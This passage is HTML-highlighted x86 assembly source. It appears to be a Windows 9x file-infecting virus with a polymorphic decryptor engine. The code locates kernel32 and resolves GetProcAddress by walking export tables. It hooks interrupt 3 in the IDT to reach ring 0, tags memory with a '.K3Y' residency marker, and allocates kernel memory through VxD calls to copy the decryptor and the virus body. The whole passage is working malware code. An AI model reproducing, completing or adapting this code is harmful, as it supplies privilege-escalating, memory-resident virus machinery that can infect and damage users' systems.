        </span><span class="sc5">LocalFree</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">







</span><span class="sc5">FixTables</span><span class="sc4">:</span><span class="sc0">




        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ZeroRegStart</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">ZeroRegEnd</span><span class="sc4">-</span><span class="sc5">ZeroRegStart</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">RandomRegs</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Registers</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">SavedOffsets</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NumberOfOffsets</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosd</span><span class="sc0">


        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">EaxTable</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">Tables</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">MemorySize</span><span class="sc4">*</span><span class="sc2">20</span><span class="sc4">+</span><span class="sc5">StackSize</span><span class="sc4">*</span><span class="sc2">20</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">LMEM_FIXED</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LMEM_ZEROINIT</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">AllocMem</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">Tables</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">MemorySize</span><span class="sc4">*</span><span class="sc2">20</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">Tables</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UndefineRegistersAndMem</span><span class="sc0">
                                
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Mem1Table</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">Tables</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
     </span><span class="sc5">PredefinedMem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsd</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">PredefinedMem</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">





</span><span class="sc5">UndefineRegistersAndMem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">EaxTable</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Registers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Writeable</span><span class="sc4">+</span><span class="sc5">Undefined</span><span class="sc0">

     </span><span class="sc5">SetOpcodeInfo1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">SetOpcodeInfo1</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">Tables</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">MemorySize</span><span class="sc4">+</span><span class="sc5">StackSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Writeable</span><span class="sc4">+</span><span class="sc5">Undefined</span><span class="sc0">

     </span><span class="sc5">SetOpcodeInfo2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">SetOpcodeInfo2</span><span class="sc0">



        </span><span class="sc6">ret</span><span class="sc0">



















        </span><span class="sc5">GetModuleHandle</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">GetProcAddress</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">GetProcAddressStr</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetProcAddress"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">GetAPIFunctions</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Temp</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetModuleHandleAndProcAddress</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">GetModuleHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">GetProcAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">WinFunctions</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

  </span><span class="sc5">CopyWinApiFunctions</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">GetModuleHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">GetProcAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">Functions</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">lstrlen</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">CopyWinApiFunctions</span><span class="sc0">
</span><span class="sc5">NoMoreApis</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Input</span><span class="sc0">
</span><span class="sc1">; eax = somewhere in kernel</span><span class="sc0">

</span><span class="sc1">; Returns</span><span class="sc0">
</span><span class="sc1">; eax = GetModuleHandler offset</span><span class="sc0">
</span><span class="sc1">; ebx = GetProcAddress offset</span><span class="sc0">

</span><span class="sc5">GetModuleHandleAndProcAddress</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0fffff000h</span><span class="sc0">                  </span><span class="sc1">; even 1000h something</span><span class="sc0">

   </span><span class="sc5">FindKernelEntry</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">FindKernelEntry</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">                    

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">FindKernelEntry</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">120</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">               
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; ebx -&gt; Export table</span><span class="sc0">
                                        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; ecx -&gt; dll name</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'NREK'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FindGetProcAddress</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">FindKernelEntry</span><span class="sc0">


</span><span class="sc1">; We can now be sure that eax points to the kernel</span><span class="sc0">
    </span><span class="sc5">FindGetProcAddress</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">GetProcAddressStr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">

     </span><span class="sc5">FindFunction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">                           </span><span class="sc1">; length of GetProcAddress,0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">cmpsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">FindFunction</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                           </span><span class="sc1">; ecx = ordinal pointer</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; esi = base+ordinals+ordnr</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; ecx = ordinal</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                           </span><span class="sc1">; ecx = ordinal*4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; ecx = ordinal*4+func tbl addr</span><span class="sc0">
                                                
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; esi = function addr in file</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; esi = function addr in mem</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">




























</span><span class="sc5">Encryptor</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">GetResident</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">GetModuleHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc12">'.K3Y'</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">DontGoRing0</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">sidt</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">                           </span><span class="sc1">; get interupt table</span><span class="sc0">


</span><span class="sc1">; hook int 3 to get get ring 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc0">                        </span><span class="sc1">; pointer to int 3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; ebx = old pointer</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Ring0Code</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; eax = new pointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; move new pointer to int 3</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">                               </span><span class="sc1">; get into ring 0</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">                        </span><span class="sc1">; return old pointer again</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

   </span><span class="sc5">DontGoRing0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">




</span><span class="sc1">; ---------------------------------------</span><span class="sc0">
</span><span class="sc1">; -------------------------------- Ring 0        </span><span class="sc0">
</span><span class="sc1">; ---------------------------------------</span><span class="sc0">


</span><span class="sc5">Ring0Code</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">GetModuleHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc12">'.K3Y'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">MemoryTable</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">GuidePos</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">MemorySize</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; push guide + decrypt size</span><span class="sc0">
                                                </span><span class="sc1">; + special variables</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">VirusEnd</span><span class="sc4">-</span><span class="sc5">VirusStart</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc0">

</span><span class="sc1">; allocate mem</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">R0_AllocMem</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxd</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ErrorRing0</span><span class="sc0">

</span><span class="sc1">; Copy guide and decryptor to ring 0 mem</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; ecx = guide + decrypt size</span><span class="sc0">
                                                </span><span class="sc1">; + special variables</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">GuidePos</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">              
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">GuidePos</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; eax = new guide pos</span><span class="sc0">
                                                </span><span class="sc1">; ebx = old guide pos</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; edx = size of guide+decrypt</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; edx = new memory pos</span><span class="sc0">
